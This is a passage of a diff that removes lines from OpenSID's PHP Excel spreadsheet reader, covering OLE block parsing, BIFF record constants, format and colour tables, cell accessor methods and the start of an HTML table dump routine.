@@ -1,1952 +1,529 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2025 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-namespace App\Libraries;
-
-use Exception;
-
-define('NUM_BIG_BLOCK_DEPOT_BLOCKS_POS', 0x2C);
-define('SMALL_BLOCK_DEPOT_BLOCK_POS', 0x3C);
-define('ROOT_START_BLOCK_POS', 0x30);
-define('BIG_BLOCK_SIZE', 0x200);
-define('SMALL_BLOCK_SIZE', 0x40);
-define('EXTENSION_BLOCK_POS', 0x44);
-define('NUM_EXTENSION_BLOCK_POS', 0x48);
-define('PROPERTY_STORAGE_BLOCK_SIZE', 0x80);
-define('BIG_BLOCK_DEPOT_BLOCKS_POS', 0x4C);
-define('SMALL_BLOCK_THRESHOLD', 0x1000);
-// property storage offsets
-define('SIZE_OF_NAME_POS', 0x40);
-define('TYPE_POS', 0x42);
-define('START_BLOCK_POS', 0x74);
-define('SIZE_POS', 0x78);
-define('IDENTIFIER_OLE', pack('CCCCCCCC', 0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1));
-
-function GetInt4d($data, $pos)
-{
-    $value = ord($data[$pos]) | (ord($data[$pos + 1]) << 8) | (ord($data[$pos + 2]) << 16) | (ord($data[$pos + 3]) << 24);
-    if ($value >= 4294967294) {
-        $value = -2;
-    }
-
-    return $value;
-}
-
-// http://uk.php.net/manual/en/function.getdate.php
-function gmgetdate($ts = null)
-{
-    $k = ['seconds', 'minutes', 'hours', 'mday', 'wday', 'mon', 'year', 'yday', 'weekday', 'month', 0];
-
-    return array_comb($k, explode(':', gmdate('s:i:G:j:w:n:Y:z:l:F:U', null === $ts ? time() : $ts)));
-}
-
-// Added for PHP4 compatibility
-function array_comb($array1, $array2)
-{
-    $out = [];
-
-    foreach ($array1 as $key => $value) {
-        $out[$value] = $array2[$key];
-    }
-
-    return $out;
-}
-
-function v($data, $pos)
-{
-    return ord($data[$pos]) | ord($data[$pos + 1]) << 8;
-}
-
-class OLERead
-{
-    public $data = '';
-
-    public function __construct()
-    {
-    }
-
-    public function read($sFileName)
-    {
-        // check if file exist and is readable (Darko Miljanovic)
-        if (! is_readable($sFileName)) {
-            $this->error = 1;
-
-            return false;
-        }
-        $this->data = @file_get_contents($sFileName);
-        if (! $this->data) {
-            $this->error = 1;
-
-            return false;
-        }
-        if (substr($this->data, 0, 8) != IDENTIFIER_OLE) {
-            $this->error = 1;
-
-            return false;
-        }
-        $this->numBigBlockDepotBlocks = GetInt4d($this->data, NUM_BIG_BLOCK_DEPOT_BLOCKS_POS);
-        $this->sbdStartBlock          = GetInt4d($this->data, SMALL_BLOCK_DEPOT_BLOCK_POS);
-        $this->rootStartBlock         = GetInt4d($this->data, ROOT_START_BLOCK_POS);
-        $this->extensionBlock         = GetInt4d($this->data, EXTENSION_BLOCK_POS);
-        $this->numExtensionBlocks     = GetInt4d($this->data, NUM_EXTENSION_BLOCK_POS);
-
-        $bigBlockDepotBlocks = [];
-        $pos                 = BIG_BLOCK_DEPOT_BLOCKS_POS;
-        $bbdBlocks           = $this->numBigBlockDepotBlocks;
-        if ($this->numExtensionBlocks != 0) {
-            $bbdBlocks = (BIG_BLOCK_SIZE - BIG_BLOCK_DEPOT_BLOCKS_POS) / 4;
-        }
-
-        for ($i = 0; $i < $bbdBlocks; $i++) {
-            $bigBlockDepotBlocks[$i] = GetInt4d($this->data, $pos);
-            $pos += 4;
-        }
-
-        for ($j = 0; $j < $this->numExtensionBlocks; $j++) {
-            $pos          = ($this->extensionBlock + 1) * BIG_BLOCK_SIZE;
-            $blocksToRead = min($this->numBigBlockDepotBlocks - $bbdBlocks, BIG_BLOCK_SIZE / 4 - 1);
-
-            for ($i = $bbdBlocks; $i < $bbdBlocks + $blocksToRead; $i++) {
-                $bigBlockDepotBlocks[$i] = GetInt4d($this->data, $pos);
-                $pos += 4;
-            }
-
-            $bbdBlocks += $blocksToRead;
-            if ($bbdBlocks < $this->numBigBlockDepotBlocks) {
-                $this->extensionBlock = GetInt4d($this->data, $pos);
-            }
-        }
-
-        // readBigBlockDepot
-        $pos                 = 0;
-        $index               = 0;
-        $this->bigBlockChain = [];
-
-        for ($i = 0; $i < $this->numBigBlockDepotBlocks; $i++) {
-            $pos = ($bigBlockDepotBlocks[$i] + 1) * BIG_BLOCK_SIZE;
-
-            //echo "pos = $pos";
-            for ($j = 0; $j < BIG_BLOCK_SIZE / 4; $j++) {
-                $this->bigBlockChain[$index] = GetInt4d($this->data, $pos);
-                $pos += 4;
-                $index++;
-            }
-        }
-
-        // readSmallBlockDepot();
-        $pos                   = 0;
-        $index                 = 0;
-        $sbdBlock              = $this->sbdStartBlock;
-        $this->smallBlockChain = [];
-
-        while ($sbdBlock != -2) {
-            $pos = ($sbdBlock + 1) * BIG_BLOCK_SIZE;
-
-            for ($j = 0; $j < BIG_BLOCK_SIZE / 4; $j++) {
-                $this->smallBlockChain[$index] = GetInt4d($this->data, $pos);
-                $pos += 4;
-                $index++;
-            }
-            $sbdBlock = $this->bigBlockChain[$sbdBlock];
-        }
-
-        // readData(rootStartBlock)
-        $block       = $this->rootStartBlock;
-        $pos         = 0;
-        $this->entry = $this->__readData($block);
-        $this->__readPropertySets();
-    }
-
-    public function __readData($bl)
-    {
-        $block = $bl;
-        $pos   = 0;
-        $data  = '';
-
-        while ($block != -2) {
-            $pos   = ($block + 1) * BIG_BLOCK_SIZE;
-            $data  = $data . substr($this->data, $pos, BIG_BLOCK_SIZE);
-            $block = $this->bigBlockChain[$block];
-        }
-
-        return $data;
-    }
-
-    public function __readPropertySets()
-    {
-        $offset = 0;
-
-        while ($offset < strlen($this->entry)) {
-            $d          = substr($this->entry, $offset, PROPERTY_STORAGE_BLOCK_SIZE);
-            $nameSize   = ord($d[SIZE_OF_NAME_POS]) | (ord($d[SIZE_OF_NAME_POS + 1]) << 8);
-            $type       = ord($d[TYPE_POS]);
-            $startBlock = GetInt4d($d, START_BLOCK_POS);
-            $size       = GetInt4d($d, SIZE_POS);
-            $name       = '';
-
-            for ($i = 0; $i < $nameSize; $i++) {
-                $name .= $d[$i];
-            }
-            $name          = str_replace("\x00", '', $name);
-            $this->props[] = [
-                'name'       => $name,
-                'type'       => $type,
-                'startBlock' => $startBlock,
-                'size'       => $size, ];
-            if ((strtolower($name) == 'workbook') || (strtolower($name) == 'book')) {
-                $this->wrkbook = count($this->props) - 1;
-            }
-            if ($name == 'Root Entry') {
-                $this->rootentry = count($this->props) - 1;
-            }
-            $offset += PROPERTY_STORAGE_BLOCK_SIZE;
-        }
-    }
-
-    public function getWorkBook()
-    {
-        if ($this->props[$this->wrkbook]['size'] < SMALL_BLOCK_THRESHOLD) {
-            $rootdata   = $this->__readData($this->props[$this->rootentry]['startBlock']);
-            $streamData = '';
-            $block      = $this->props[$this->wrkbook]['startBlock'];
-            $pos        = 0;
-
-            while ($block != -2) {
-                $pos = $block * SMALL_BLOCK_SIZE;
-                $streamData .= substr($rootdata, $pos, SMALL_BLOCK_SIZE);
-                $block = $this->smallBlockChain[$block];
-            }
-
-            return $streamData;
-        }
-        $numBlocks = $this->props[$this->wrkbook]['size'] / BIG_BLOCK_SIZE;
-        if ($this->props[$this->wrkbook]['size'] % BIG_BLOCK_SIZE != 0) {
-            $numBlocks++;
-        }
-
-        if ($numBlocks == 0) {
-            return '';
-        }
-        $streamData = '';
-        $block      = $this->props[$this->wrkbook]['startBlock'];
-        $pos        = 0;
-
-        while ($block != -2) {
-            $pos = ($block + 1) * BIG_BLOCK_SIZE;
-            $streamData .= substr($this->data, $pos, BIG_BLOCK_SIZE);
-            $block = $this->bigBlockChain[$block];
-        }
-
-        return $streamData;
-    }
-}
-
-define('SPREADSHEET_EXCEL_READER_BIFF8', 0x600);
-define('SPREADSHEET_EXCEL_READER_BIFF7', 0x500);
-define('SPREADSHEET_EXCEL_READER_WORKBOOKGLOBALS', 0x5);
-define('SPREADSHEET_EXCEL_READER_WORKSHEET', 0x10);
-define('SPREADSHEET_EXCEL_READER_TYPE_BOF', 0x809);
-define('SPREADSHEET_EXCEL_READER_TYPE_EOF', 0x0A);
-define('SPREADSHEET_EXCEL_READER_TYPE_BOUNDSHEET', 0x85);
-define('SPREADSHEET_EXCEL_READER_TYPE_DIMENSION', 0x200);
-define('SPREADSHEET_EXCEL_READER_TYPE_ROW', 0x208);
-define('SPREADSHEET_EXCEL_READER_TYPE_DBCELL', 0xD7);
-define('SPREADSHEET_EXCEL_READER_TYPE_FILEPASS', 0x2F);
-define('SPREADSHEET_EXCEL_READER_TYPE_NOTE', 0x1C);
-define('SPREADSHEET_EXCEL_READER_TYPE_TXO', 0x1B6);
-define('SPREADSHEET_EXCEL_READER_TYPE_RK', 0x7E);
-define('SPREADSHEET_EXCEL_READER_TYPE_RK2', 0x27E);
-define('SPREADSHEET_EXCEL_READER_TYPE_MULRK', 0xBD);
-define('SPREADSHEET_EXCEL_READER_TYPE_MULBLANK', 0xBE);
-define('SPREADSHEET_EXCEL_READER_TYPE_INDEX', 0x20B);
-define('SPREADSHEET_EXCEL_READER_TYPE_SST', 0xFC);
-define('SPREADSHEET_EXCEL_READER_TYPE_EXTSST', 0xFF);
-define('SPREADSHEET_EXCEL_READER_TYPE_CONTINUE', 0x3C);
-define('SPREADSHEET_EXCEL_READER_TYPE_LABEL', 0x204);
-define('SPREADSHEET_EXCEL_READER_TYPE_LABELSST', 0xFD);
-define('SPREADSHEET_EXCEL_READER_TYPE_NUMBER', 0x203);
-define('SPREADSHEET_EXCEL_READER_TYPE_NAME', 0x18);
-define('SPREADSHEET_EXCEL_READER_TYPE_ARRAY', 0x221);
-define('SPREADSHEET_EXCEL_READER_TYPE_STRING', 0x207);
-define('SPREADSHEET_EXCEL_READER_TYPE_FORMULA', 0x406);
-define('SPREADSHEET_EXCEL_READER_TYPE_FORMULA2', 0x6);
-define('SPREADSHEET_EXCEL_READER_TYPE_FORMAT', 0x41E);
-define('SPREADSHEET_EXCEL_READER_TYPE_XF', 0xE0);
-define('SPREADSHEET_EXCEL_READER_TYPE_BOOLERR', 0x205);
-define('SPREADSHEET_EXCEL_READER_TYPE_FONT', 0x0031);
-define('SPREADSHEET_EXCEL_READER_TYPE_PALETTE', 0x0092);
-define('SPREADSHEET_EXCEL_READER_TYPE_UNKNOWN', 0xFFFF);
-define('SPREADSHEET_EXCEL_READER_TYPE_NINETEENFOUR', 0x22);
-define('SPREADSHEET_EXCEL_READER_TYPE_MERGEDCELLS', 0xE5);
-define('SPREADSHEET_EXCEL_READER_UTCOFFSETDAYS', 25569);
-define('SPREADSHEET_EXCEL_READER_UTCOFFSETDAYS1904', 24107);
-define('SPREADSHEET_EXCEL_READER_MSINADAY', 86400);
-define('SPREADSHEET_EXCEL_READER_TYPE_HYPER', 0x01B8);
-define('SPREADSHEET_EXCEL_READER_TYPE_COLINFO', 0x7D);
-define('SPREADSHEET_EXCEL_READER_TYPE_DEFCOLWIDTH', 0x55);
-define('SPREADSHEET_EXCEL_READER_TYPE_STANDARDWIDTH', 0x99);
-define('SPREADSHEET_EXCEL_READER_DEF_NUM_FORMAT', '%s');
-
-// Main Class
-class SpreadsheetExcelReader
-{
-    // MK: Added to make data retrieval easier
-    public $colnames         = [];
-    public $colindexes       = [];
-    public $standardColWidth = 0;
-    public $defaultColWidth  = 0;
-
-    // --------------
-    // END PUBLIC API
-
-    public $boundsheets   = [];
-    public $formatRecords = [];
-    public $fontRecords   = [];
-    public $xfRecords     = [];
-    public $colInfo       = [];
-    public $rowInfo       = [];
-    public $sst           = [];
-    public $sheets        = [];
-    public $data;
-    public $_ole;
-    public $_defaultEncoding = 'UTF-8';
-    public $_defaultFormat   = SPREADSHEET_EXCEL_READER_DEF_NUM_FORMAT;
-    public $_columnsFormat   = [];
-    public $_rowoffset       = 1;
-    public $_coloffset       = 1;
-
-    /**
-     * List of default date formats used by Excel
-     */
-    public $dateFormats = [
-        0xE  => 'm/d/Y',
-        0xF  => 'M-d-Y',
-        0x10 => 'd-M',
-        0x11 => 'M-Y',
-        0x12 => 'h:i a',
-        0x13 => 'h:i:s a',
-        0x14 => 'H:i',
-        0x15 => 'H:i:s',
-        0x16 => 'd/m/Y H:i',
-        0x2D => 'i:s',
-        0x2E => 'H:i:s',
-        0x2F => 'i:s.S',
-    ];
-
-    /**
-     * Default number formats used by Excel
-     */
-    public $numberFormats = [
-        0x1  => '0',
-        0x2  => '0.00',
-        0x3  => '#,##0',
-        0x4  => '#,##0.00',
-        0x5  => '$#,##0;($#,##0)',
-        0x6  => '$#,##0;[Red]($#,##0)',
-        0x7  => '$#,##0.00;($#,##0.00)',
-        0x8  => '$#,##0.00;[Red]($#,##0.00)',
-        0x9  => '0%',
-        0xA  => '0.00%',
-        0xB  => '0.00E+00',
-        0x25 => '#,##0;(#,##0)',
-        0x26 => '#,##0;[Red](#,##0)',
-        0x27 => '#,##0.00;(#,##0.00)',
-        0x28 => '#,##0.00;[Red](#,##0.00)',
-        0x29 => '#,##0;(#,##0)',  // Not exactly
-        0x2A => '$#,##0;($#,##0)',  // Not exactly
-        0x2B => '#,##0.00;(#,##0.00)',  // Not exactly
-        0x2C => '$#,##0.00;($#,##0.00)',  // Not exactly
-        0x30 => '##0.0E+0',
-    ];
-
-    public $colors = [
-        0x00 => '#000000',
-        0x01 => '#FFFFFF',
-        0x02 => '#FF0000',
-        0x03 => '#00FF00',
-        0x04 => '#0000FF',
-        0x05 => '#FFFF00',
-        0x06 => '#FF00FF',
-        0x07 => '#00FFFF',
-        0x08 => '#000000',
-        0x09 => '#FFFFFF',
-        0x0A => '#FF0000',
-        0x0B => '#00FF00',
-        0x0C => '#0000FF',
-        0x0D => '#FFFF00',
-        0x0E => '#FF00FF',
-        0x0F => '#00FFFF',
-        0x10 => '#800000',
-        0x11 => '#008000',
-        0x12 => '#000080',
-        0x13 => '#808000',
-        0x14 => '#800080',
-        0x15 => '#008080',
-        0x16 => '#C0C0C0',
-        0x17 => '#808080',
-        0x18 => '#9999FF',
-        0x19 => '#993366',
-        0x1A => '#FFFFCC',
-        0x1B => '#CCFFFF',
-        0x1C => '#660066',
-        0x1D => '#FF8080',
-        0x1E => '#0066CC',
-        0x1F => '#CCCCFF',
-        0x20 => '#000080',
-        0x21 => '#FF00FF',
-        0x22 => '#FFFF00',
-        0x23 => '#00FFFF',
-        0x24 => '#800080',
-        0x25 => '#800000',
-        0x26 => '#008080',
-        0x27 => '#0000FF',
-        0x28 => '#00CCFF',
-        0x29 => '#CCFFFF',
-        0x2A => '#CCFFCC',
-        0x2B => '#FFFF99',
-        0x2C => '#99CCFF',
-        0x2D => '#FF99CC',
-        0x2E => '#CC99FF',
-        0x2F => '#FFCC99',
-        0x30 => '#3366FF',
-        0x31 => '#33CCCC',
-        0x32 => '#99CC00',
-        0x33 => '#FFCC00',
-        0x34 => '#FF9900',
-        0x35 => '#FF6600',
-        0x36 => '#666699',
-        0x37 => '#969696',
-        0x38 => '#003366',
-        0x39 => '#339966',
-        0x3A => '#003300',
-        0x3B => '#333300',
-        0x3C => '#993300',
-        0x3D => '#993366',
-        0x3E => '#333399',
-        0x3F => '#333333',
-        0x40 => '#000000',
-        0x41 => '#FFFFFF',
-
-        0x43 => '#000000',
-        0x4D => '#000000',
-        0x4E => '#FFFFFF',
-        0x4F => '#000000',
-        0x50 => '#FFFFFF',
-        0x51 => '#000000',
-
-        0x7FFF => '#000000',
-    ];
-    public $lineStyles = [
-        0x00 => '',
-        0x01 => 'Thin',
-        0x02 => 'Medium',
-        0x03 => 'Dashed',
-        0x04 => 'Dotted',
-        0x05 => 'Thick',
-        0x06 => 'Double',
-        0x07 => 'Hair',
-        0x08 => 'Medium dashed',
-        0x09 => 'Thin dash-dotted',
-        0x0A => 'Medium dash-dotted',
-        0x0B => 'Thin dash-dot-dotted',
-        0x0C => 'Medium dash-dot-dotted',
-        0x0D => 'Slanted medium dash-dotted',
-    ];
-    public $lineStylesCss = [
-        'Thin'                      => '1px solid',
-        'Medium'                    => '2px solid',
-        'Dashed'                    => '1px dashed',
-        'Dotted'                    => '1px dotted',
-        'Thick'                     => '3px solid',
-        'Double'                    => 'double',
-        'Hair'                      => '1px solid',
-        'Medium dashed'             => '2px dashed',
-        'Thin dash-dotted'          => '1px dashed',
-        'Medium dash-dotted'        => '2px dashed',
-        'Thin dash-dot-dotted'      => '1px dashed',
-        'Medium dash-dot-dotted'    => '2px dashed',
-        'Slanted medium dash-dotte' => '2px dashed',
-    ];
-
-    /**
-     * Constructor
-     *
-     * Some basic initialisation
-     *
-     * @param mixed $file
-     * @param mixed $store_extended_info
-     * @param mixed $outputEncoding
-     */
-    public function __construct($file = '', $store_extended_info = true, $outputEncoding = '')
-    {
-        $this->_ole = new OLERead();
-        $this->setUTFEncoder('iconv');
-        if ($outputEncoding != '') {
-            $this->setOutputEncoding($outputEncoding);
-        }
-
-        for ($i = 1; $i < 245; $i++) {
-            $name                  = strtolower(((($i - 1) / 26 >= 1) ? chr(($i - 1) / 26 + 64) : '') . chr(($i - 1) % 26 + 65));
-            $this->colnames[$name] = $i;
-            $this->colindexes[$i]  = $name;
-        }
-        $this->store_extended_info = $store_extended_info;
-        if ($file != '') {
-            $this->read($file);
-        }
-    }
-
-    public function myHex($d)
-    {
-        if ($d < 16) {
-            return '0' . dechex($d);
-        }
-
-        return dechex($d);
-    }
-
-    public function dumpHexData($data, $pos, $length)
-    {
-        $info = '';
-
-        for ($i = 0; $i <= $length; $i++) {
-            $info .= ($i == 0 ? '' : ' ') . $this->myHex(ord($data[$pos + $i])) . (ord($data[$pos + $i]) > 31 ? '[' . $data[$pos + $i] . ']' : '');
-        }
-
-        return $info;
-    }
-
-    public function getCol($col)
-    {
-        if (is_string($col)) {
-            $col = strtolower($col);
-            if (array_key_exists($col, $this->colnames)) {
-                $col = $this->colnames[$col];
-            }
-        }
-
-        return $col;
-    }
-
-    // PUBLIC API FUNCTIONS
-    // --------------------
-
-    public function val($row, $col, $sheet = 0)
-    {
-        $col = $this->getCol($col);
-        if (array_key_exists($row, $this->sheets[$sheet]['cells']) && array_key_exists($col, $this->sheets[$sheet]['cells'][$row])) {
-            return $this->sheets[$sheet]['cells'][$row][$col];
-        }
-
-        return '';
-    }
-
-    public function value($row, $col, $sheet = 0)
-    {
-        return $this->val($row, $col, $sheet);
-    }
-
-    public function info($row, $col, $type = '', $sheet = 0)
-    {
-        $col = $this->getCol($col);
-        if (array_key_exists('cellsInfo', $this->sheets[$sheet])
-                && array_key_exists($row, $this->sheets[$sheet]['cellsInfo'])
-                && array_key_exists($col, $this->sheets[$sheet]['cellsInfo'][$row])
-                && array_key_exists($type, $this->sheets[$sheet]['cellsInfo'][$row][$col])) {
-            return $this->sheets[$sheet]['cellsInfo'][$row][$col][$type];
-        }
-
-        return '';
-    }
-
-    public function type($row, $col, $sheet = 0)
-    {
-        return $this->info($row, $col, 'type', $sheet);
-    }
-
-    public function raw($row, $col, $sheet = 0)
-    {
-        return $this->info($row, $col, 'raw', $sheet);
-    }
-
-    public function rowspan($row, $col, $sheet = 0)
-    {
-        $val = $this->info($row, $col, 'rowspan', $sheet);
-        if ($val == '') {
-            return 1;
-        }
-
-        return $val;
-    }
-
-    public function colspan($row, $col, $sheet = 0)
-    {
-        $val = $this->info($row, $col, 'colspan', $sheet);
-        if ($val == '') {
-            return 1;
-        }
-
-        return $val;
-    }
-
-    public function hyperlink($row, $col, $sheet = 0)
-    {
-        $link = $this->sheets[$sheet]['cellsInfo'][$row][$col]['hyperlink'];
-        if ($link) {
-            return $link['link'];
-        }
-
-        return '';
-    }
-
-    public function rowcount($sheet = 0)
-    {
-        return $this->sheets[$sheet]['numRows'];
-    }
-
-    public function colcount($sheet = 0)
-    {
-        return $this->sheets[$sheet]['numCols'];
-    }
-
-    public function colwidth($col, $sheet = 0)
-    {
-        // Col width is actually the width of the number 0. So we have to estimate and come close
-        return $this->colInfo[$sheet][$col]['width'] / 9142 * 200;
-    }
-
-    public function colhidden($col, $sheet = 0)
-    {
-        return (bool) $this->colInfo[$sheet][$col]['hidden'];
-    }
-
-    public function rowheight($row, $sheet = 0)
-    {
-        return $this->rowInfo[$sheet][$row]['height'];
-    }
-
-    public function rowhidden($row, $sheet = 0)
-    {
-        return (bool) $this->rowInfo[$sheet][$row]['hidden'];
-    }
-
-    // GET THE CSS FOR FORMATTING
-    // ==========================
-    public function style($row, $col, $sheet = 0, $properties = '')
-    {
-        $css  = '';
-        $font = $this->font($row, $col, $sheet);
-        if ($font != '') {
-            $css .= "font-family:{$font};";
-        }
-        $align = $this->align($row, $col, $sheet);
-        if ($align != '') {
-            $css .= "text-align:{$align};";
-        }
-        $height = $this->height($row, $col, $sheet);
-        if ($height != '') {
-            $css .= "font-size:{$height}" . 'px;';
-        }
-        $bgcolor = $this->bgColor($row, $col, $sheet);
-        if ($bgcolor != '') {
-            $bgcolor = $this->colors[$bgcolor];
-            $css .= "background-color:{$bgcolor};";
-        }
-        $color = $this->color($row, $col, $sheet);
-        if ($color != '') {
-            $css .= "color:{$color};";
-        }
-        $bold = $this->bold($row, $col, $sheet);
-        if ($bold) {
-            $css .= 'font-weight:bold;';
-        }
-        $italic = $this->italic($row, $col, $sheet);
-        if ($italic) {
-            $css .= 'font-style:italic;';
-        }
-        $underline = $this->underline($row, $col, $sheet);
-        if ($underline) {
-            $css .= 'text-decoration:underline;';
-        }
-        // Borders
-        $bLeft      = $this->borderLeft($row, $col, $sheet);
-        $bRight     = $this->borderRight($row, $col, $sheet);
-        $bTop       = $this->borderTop($row, $col, $sheet);
-        $bBottom    = $this->borderBottom($row, $col, $sheet);
-        $bLeftCol   = $this->borderLeftColor($row, $col, $sheet);
-        $bRightCol  = $this->borderRightColor($row, $col, $sheet);
-        $bTopCol    = $this->borderTopColor($row, $col, $sheet);
-        $bBottomCol = $this->borderBottomColor($row, $col, $sheet);
-        // Try to output the minimal required style
-        if ($bLeft != '' && $bLeft == $bRight && $bRight == $bTop && $bTop == $bBottom) {
-            $css .= 'border:' . $this->lineStylesCss[$bLeft] . ';';
-        } else {
-            if ($bLeft != '') {
-                $css .= 'border-left:' . $this->lineStylesCss[$bLeft] . ';';
-            }
-            if ($bRight != '') {
-                $css .= 'border-right:' . $this->lineStylesCss[$bRight] . ';';
-            }
-            if ($bTop != '') {
-                $css .= 'border-top:' . $this->lineStylesCss[$bTop] . ';';
-            }
-            if ($bBottom != '') {
-                $css .= 'border-bottom:' . $this->lineStylesCss[$bBottom] . ';';
-            }
-        }
-        // Only output border colors if there is an actual border specified
-        if ($bLeft != '' && $bLeftCol != '') {
-            $css .= 'border-left-color:' . $bLeftCol . ';';
-        }
-        if ($bRight != '' && $bRightCol != '') {
-            $css .= 'border-right-color:' . $bRightCol . ';';
-        }
-        if ($bTop != '' && $bTopCol != '') {
-            $css .= 'border-top-color:' . $bTopCol . ';';
-        }
-        if ($bBottom != '' && $bBottomCol != '') {
-            $css .= 'border-bottom-color:' . $bBottomCol . ';';
-        }
-
-        return $css;
-    }
-
-    // FORMAT PROPERTIES
-    // =================
-    public function format($row, $col, $sheet = 0)
-    {
-        return $this->info($row, $col, 'format', $sheet);
-    }
-
-    public function formatIndex($row, $col, $sheet = 0)
-    {
-        return $this->info($row, $col, 'formatIndex', $sheet);
-    }
-
-    public function formatColor($row, $col, $sheet = 0)
-    {
-        return $this->info($row, $col, 'formatColor', $sheet);
-    }
-
-    // CELL (XF) PROPERTIES
-    // ====================
-    public function xfRecord($row, $col, $sheet = 0)
-    {
-        $xfIndex = $this->info($row, $col, 'xfIndex', $sheet);
-        if ($xfIndex != '') {
-            return $this->xfRecords[$xfIndex];
-        }
-
-        return null;
-    }
-
-    public function xfProperty($row, $col, $sheet, $prop)
-    {
-        $xfRecord = $this->xfRecord($row, $col, $sheet);
-        if ($xfRecord != null) {
-            return $xfRecord[$prop];
-        }
-
-        return '';
-    }
-
-    public function align($row, $col, $sheet = 0)
-    {
-        return $this->xfProperty($row, $col, $sheet, 'align');
-    }
-
-    public function bgColor($row, $col, $sheet = 0)
-    {
-        return $this->xfProperty($row, $col, $sheet, 'bgColor');
-    }
-
-    public function borderLeft($row, $col, $sheet = 0)
-    {
-        return $this->xfProperty($row, $col, $sheet, 'borderLeft');
-    }
-
-    public function borderRight($row, $col, $sheet = 0)
-    {
-        return $this->xfProperty($row, $col, $sheet, 'borderRight');
-    }
-
-    public function borderTop($row, $col, $sheet = 0)
-    {
-        return $this->xfProperty($row, $col, $sheet, 'borderTop');
-    }
-
-    public function borderBottom($row, $col, $sheet = 0)
-    {
-        return $this->xfProperty($row, $col, $sheet, 'borderBottom');
-    }
-
-    public function borderLeftColor($row, $col, $sheet = 0)
-    {
-        return $this->colors[$this->xfProperty($row, $col, $sheet, 'borderLeftColor')];
-    }
-
-    public function borderRightColor($row, $col, $sheet = 0)
-    {
-        return $this->colors[$this->xfProperty($row, $col, $sheet, 'borderRightColor')];
-    }
-
-    public function borderTopColor($row, $col, $sheet = 0)
-    {
-        return $this->colors[$this->xfProperty($row, $col, $sheet, 'borderTopColor')];
-    }
-
-    public function borderBottomColor($row, $col, $sheet = 0)
-    {
-        return $this->colors[$this->xfProperty($row, $col, $sheet, 'borderBottomColor')];
-    }
-
-    // FONT PROPERTIES
-    // ===============
-    public function fontRecord($row, $col, $sheet = 0)
-    {
-        $xfRecord = $this->xfRecord($row, $col, $sheet);
-        if ($xfRecord != null) {
-            $font = $xfRecord['fontIndex'];
-            if ($font != null) {
-                return $this->fontRecords[$font];
-            }
-        }
-
-        return null;
-    }
-
-    public function fontProperty($row, $col, $sheet, $prop)
-    {
-        $font = $this->fontRecord($row, $col, $sheet);
-        if ($font != null) {
-            return $font[$prop];
-        }
-
-        return false;
-    }
-
-    public function fontIndex($row, $col, $sheet = 0)
-    {
-        return $this->xfProperty($row, $col, $sheet, 'fontIndex');
-    }
-
-    public function color($row, $col, $sheet = 0)
-    {
-        $formatColor = $this->formatColor($row, $col, $sheet);
-        if ($formatColor != '') {
-            return $formatColor;
-        }
-        $ci = $this->fontProperty($row, $col, $sheet, 'color');
-
-        return $this->rawColor($ci);
-    }
-
-    public function rawColor($ci)
-    {
-        if (($ci != 0x7FFF) && ($ci != '')) {
-            return $this->colors[$ci];
-        }
-
-        return '';
-    }
-
-    public function bold($row, $col, $sheet = 0)
-    {
-        return $this->fontProperty($row, $col, $sheet, 'bold');
-    }
-
-    public function italic($row, $col, $sheet = 0)
-    {
-        return $this->fontProperty($row, $col, $sheet, 'italic');
-    }
-
-    public function underline($row, $col, $sheet = 0)
-    {
-        return $this->fontProperty($row, $col, $sheet, 'under');
-    }
-
-    public function height($row, $col, $sheet = 0)
-    {
-        return $this->fontProperty($row, $col, $sheet, 'height');
-    }
-
-    public function font($row, $col, $sheet = 0)
-    {
-        return $this->fontProperty($row, $col, $sheet, 'font');
-    }
-
-    // DUMP AN HTML TABLE OF THE ENTIRE XLS DATA
-    // =========================================
-    public function dump($row_numbers = false, $col_letters = false, $sheet = 0, $table_class = 'excel')
-    {
-        $out = "<table class=\"{$table_class}\" cellspacing=0>";
-        if ($col_letters) {
-            $out .= "<thead>\n\t<tr>";
-            if ($row_numbers) {
-                $out .= "\n\t\t<th>&nbsp</th>";
-            }
-
-            for ($i = 1; $i <= $this->colcount($sheet); $i++) {
-                $style = 'width:' . ($this->colwidth($i, $sheet) * 1) . 'px;';
-                if ($this->colhidden($i, $sheet)) {
-                    $style .= 'display:none;';
-                }
-                $out .= "\n\t\t<th style=\"{$style}\">" . strtoupper($this->colindexes[$i]) . '</th>';
-            }
-            $out .= "</tr></thead>\n";
-        }
-
-        $out .= "<tbody>\n";
-
-        for ($row = 1; $row <= $this->rowcount($sheet); $row++) {
-            $rowheight = $this->rowheight($row, $sheet);
-            $style     = 'height:' . ($rowheight * (4 / 3)) . 'px;';
-            if ($this->rowhidden($row, $sheet)) {
-                $style .= 'display:none;';
-            }
-            $out .= "\n\t<tr style=\"{$style}\">";
-            if ($row_numbers) {
-                $out .= "\n\t\t<th>{$row}</th>";
-            }
-
